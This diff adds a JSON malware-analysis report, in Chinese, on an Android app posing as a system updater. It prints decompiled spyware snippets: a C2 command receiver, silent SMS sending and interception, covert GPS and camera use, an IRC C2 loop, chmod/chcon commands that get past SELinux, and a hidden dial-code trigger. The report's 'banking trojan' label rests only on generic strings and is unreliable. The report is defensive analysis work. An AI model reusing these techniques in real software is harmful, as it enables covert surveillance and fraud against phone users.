@@ -1,0 +1,275 @@
+{
+  "APK信息": {
+    "文件名": "e1a660b6125bd0df2ecb6560e42d692c91d7ad958ee825d780561e481badc988.apk",
+    "sha256": "e1a660b6125bd0df2ecb6560e42d692c91d7ad958ee825d780561e481badc988",
+    "包名": "com.android.system.bdata",
+    "应用名": "System data updater",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 251.4
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "report"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\ActionReceiver;",
+          "method_signature": "if(action == null || !action.equals(\"ACTION_BDATA_CMD\")",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String action = intent.getAction();\nif (action == null || !action.equals(\"ACTION_BDATA_CMD\")) { return; }\nIntent intent2 = new Intent(context, DataService.class);\nif (intent.hasExtra(\"CMD\")) {\n    String stringExtra = intent.getStringExtra(\"CMD\");\n    String stringExtra2 = intent.getStringExtra(\"FROM\");\n    intent2.setAction(\"ACTION_BDATA_CMD\");\n    intent2.putExtra(\"CMD\", stringExtra).putExtra(\"FROM\", stringExtra2);\n} else if (intent.hasExtra(\"GPS\")) {\n    z.b = true;",
+          "malicious_code_snippet_context": "              return;\n          }\n          try {\n>>>             String action = intent.getAction();\n>>>             if (action == null || !action.equals(\"ACTION_BDATA_CMD\")) {\n>>>                 return;\n>>>             }\n>>>             Intent intent2 = new Intent(context, (Class<?>) DataService.class);\n>>>             if (intent.hasExtra(\"CMD\")) {\n>>>                 String stringExtra = intent.getStringExtra(\"CMD\");\n>>>                 String stringExtra2 = intent.getStringExtra(\"FROM\");\n>>>                 intent2.setAction(\"ACTION_BDATA_CMD\");\n>>>                 intent2.putExtra(\"CMD\", stringExtra).putExtra(\"FROM\", stringExtra2);\n              } else if (intent.hasExtra(\"GPS\")) {\n                  z.b = true;\n                  String stringExtra3 = intent.getStringExtra(\"GPS\");",
+          "behavior_description": "该BroadcastReceiver伪装为系统组件(com.android.system.bdata)，监听自定义广播action \"ACTION_BDATA_CMD\"作为C2指令入口。收到广播后，从Intent中提取\"CMD\"命令字段和\"FROM\"来源字段，转发给DataService服务执行远程控制指令；若包含\"GPS\"字段则开启位置追踪标志(z.b=true)。攻击者可通过发送广播向恶意软件下发任意命令，实现远程控制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\bk;",
+          "method_signature": "while(it.hasNext()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager smsManager = SmsManager.getDefault();\nString string = DataService.d.getString(\"number\", str);\nIterator<String> it = smsManager.divideMessage(str2).iterator();\nwhile (it.hasNext()) {\n    smsManager.sendTextMessage(string, null, it.next(), null, null);\n}",
+          "malicious_code_snippet_context": "              if (!DataService.d.getBoolean(\"sends\", false) || (string = DataService.d.getString(\"number\", str)) == null || str2 == null) {\n                  return;\n              }\n>>>             SmsManager smsManager = SmsManager.getDefault();\n>>>             Iterator<String> it = smsManager.divideMessage(str2).iterator();\n>>>             while (it.hasNext()) {\n>>>                 smsManager.sendTextMessage(string, null, it.next(), null, null);\n>>>             }\n>>>         } catch (Exception e) {\n              bq.a(\"sSM\", e);\n          }\n      }",
+          "behavior_description": "该代码从 DataService 配置中读取目标号码（number）和发送开关（sends），使用 SmsManager.getDefault() 获取短信管理器，将传入的短信内容分割后循环调用 sendTextMessage 静默发送短信到指定号码。类路径伪装为 com.android.system 系统包以隐蔽自身，目标号码和内容均可由远程配置控制，属于典型的短信欺诈行为，可能导致用户被扣费或泄露隐私。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\SmsStart;",
+          "method_signature": "if(str3.charAt(0)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (str3.charAt(0) == '#') { abortBroadcast(); } intent2.setAction(\"scmd\");",
+          "malicious_code_snippet_context": "if (str3.charAt(0) == '#') { abortBroadcast(); } intent2.setAction(\"scmd\");",
+          "behavior_description": "该代码在短信广播接收器中，当收到的短信内容以 '#' 开头时，调用 abortBroadcast() 终止广播传递，使系统短信应用和其他应用无法收到该短信，实现短信隐藏/拦截。随后将短信内容通过 Intent 传递给 DataService（action 为 scmd）进行处理，表明 '#' 开头的短信是 C2 控制指令，拦截后由恶意服务解析执行，用户完全无感知。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\ad;",
+          "method_signature": "if(i < 2)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (i < 2) {\n    locationManager2.requestLocationUpdates(\"gps\", 0L, 0.0f, locationListener2);\n}\nif (i2 != 1) {\n    locationManager.requestLocationUpdates(\"network\", 0L, 0.0f, locationListener);\n}",
+          "malicious_code_snippet_context": "          try {\n              z.i = new ae(null);\n              i = z.g;\n>>>             if (i < 2) {\n>>>                 locationManager2 = z.h;\n>>>                 locationListener2 = z.i;\n>>>                 locationManager2.requestLocationUpdates(\"gps\", 0L, 0.0f, locationListener2);\n>>>             }\n>>>             i2 = z.g;\n              if (i2 != 1) {\n                  locationManager = z.h;\n                  locationListener = z.i;",
+          "behavior_description": "代码通过LocationManager同时请求GPS和网络定位，且将最小时间间隔和最小距离均设为0，实现高频、实时的设备位置追踪，属于过度收集用户位置隐私行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password",
+              "login"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\af;",
+          "method_signature": "if(SystemClock.elapsedRealtime()",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (readLine.contains(\" 432 \")) {\n    f(\"IBadNick\");\n    return;\n} else if (readLine.startsWith(\"PING \")) {\n    b.write(\"PONG \" + readLine.substring(5) + \"\\r\\n\");\n    b.flush();\n} else {\n    if (SystemClock.elapsedRealtime() > elapsedRealtime) {\n        e(\"Login timeout\");\n        return;\n    }\n    Thread.sleep(100L);\n}",
+          "malicious_code_snippet_context": "if (readLine.contains(\" 432 \")) {\n    f(\"IBadNick\");\n    return;\n} else if (readLine.startsWith(\"PING \")) {\n    b.write(\"PONG \" + readLine.substring(5) + \"\\r\\n\");\n    b.flush();\n} else {\n    if (SystemClock.elapsedRealtime() > elapsedRealtime) {\n        e(\"Login timeout\");\n        return;\n    }\n    Thread.sleep(100L);\n}",
+          "behavior_description": "该代码实现了IRC（Internet Relay Chat）协议的客户端通信逻辑，用于与远程C2（命令与控制）服务器建立并维持连接。代码通过读取网络流中的数据(readLine)解析IRC服务器的响应，处理如错误的昵称(432错误码)以及心跳保活(PING/PONG)机制，并检查登录超时。在恶意软件背景下，这是典型的基于IRC协议的僵尸网络或后门通信模块，用于接收远程指令。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\CameraService;",
+          "method_signature": "if(this.m != 0)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.i = this.h.getParameters();\nthis.i.setFlashMode(\"off\");\nif (this.m != 0) {\n    this.i.setPictureSize(this.m, this.e);\n}\nthis.h.setParameters(this.i);\nthis.h.startPreview();\nthis.h.takePicture(null, null, this.n);",
+          "malicious_code_snippet_context": "                  this.h = a(this.l);\n                  if (this.h != null) {\n                      this.h.setPreviewDisplay(this.a.getHolder());\n>>>                     this.i = this.h.getParameters();\n>>>                     this.i.setFlashMode(\"off\");\n>>>                     if (this.m != 0) {\n>>>                         this.i.setPictureSize(this.m, this.e);\n>>>                     } else {\n>>>                         e();\n>>>                     }\n>>>                     this.h.setParameters(this.i);\n                      this.h.startPreview();\n                      a();\n                      this.h.takePicture(null, null, this.n);",
+          "behavior_description": "代码获取相机参数并强制关闭闪光灯，随后启动预览并调用takePicture进行拍照。结合伪装的系统类名和关闭闪光灯的隐蔽操作，表明该代码在用户不知情的情况下秘密调用摄像头进行拍照，存在严重的隐私窃取风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\aj;",
+          "method_signature": "if(file2.isDirectory()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!file2.canRead()) { bo.c(\"chmod 666 \" + parent); bo.c(\"chcon u:object_r:app_data_file:s0:c512,c768 \" + parent); } if (file2.isDirectory()) { File[] listFiles = file2.listFiles(new ak(contains, replace2)); for (File file3 : listFiles) { b(file3.getAbsolutePath()); } }",
+          "malicious_code_snippet_context": "if (!file2.canRead()) { bo.c(\"chmod 666 \" + parent); bo.c(\"chcon u:object_r:app_data_file:s0:c512,c768 \" + parent); } if (file2.isDirectory()) { File[] listFiles = file2.listFiles(new ak(contains, replace2)); for (File file3 : listFiles) { b(file3.getAbsolutePath()); } }",
+          "behavior_description": "该代码递归遍历文件系统目录，当遇到不可读的目录时，通过执行shell命令 chmod 666 修改文件权限为全局可读写，并通过 chcon 修改SELinux安全上下文，绕过Android安全机制获取对敏感文件的访问权。随后使用自定义过滤器 ak 筛选目标文件，对匹配的文件递归调用 b() 方法进行深度遍历，实现批量文件收集，为后续数据窃取或加密勒索做准备。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\system\\bdata\\CallReceiver;",
+          "method_signature": "if(intent.getStringExtra(\"state\")",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (action.equals(\"android.intent.action.NEW_OUTGOING_CALL\") && intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").equals(\"9909\")) {\n    edit.putBoolean(\"pdia\", true);\n    edit.commit();\n    setResultData(null);\n    context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, DataServiceController.class), 1, 1);\n    Intent intent3 = new Intent(context, DataServiceController.class);\n    intent3.addFlags(268435456);\n    context.startActivity(intent3);\n}",
+          "malicious_code_snippet_context": "                          intent2.setAction(\"cdate\");\n                          context.startService(intent2);\n                      }\n>>>                 } else if (action.equals(\"android.intent.action.NEW_OUTGOING_CALL\") && intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").equals(\"9909\")) {\n>>>                     SharedPreferences.Editor edit = sharedPreferences.edit();\n>>>                     edit.putBoolean(\"pdia\", true);\n>>>                     edit.commit();\n>>>                     setResultData(null);\n>>>                     context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) DataServiceController.class), 1, 1);\n>>>                     Intent intent3 = new Intent(context, (Class<?>) DataServiceController.class);\n>>>                     intent3.addFlags(268435456);\n>>>                     context.startActivity(intent3);\n                  }\n              }\n          } catch (Exception e) {",
+          "behavior_description": "代码监听NEW_OUTGOING_CALL广播，当检测到用户拨打特定号码\"9909\"时，先通过setResultData(null)拦截实际拨号行为使用户无感知，然后通过setComponentEnabledSetting将隐藏的DataServiceController组件重新启用（参数1=COMPONENT_ENABLED_STATE_ENABLED），并启动该Activity。这是恶意软件典型的图标隐藏/秘密触发机制：平时通过禁用MainActivity隐藏图标躲避用户察觉，仅通过特定拨号暗码唤起恶意控制界面。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
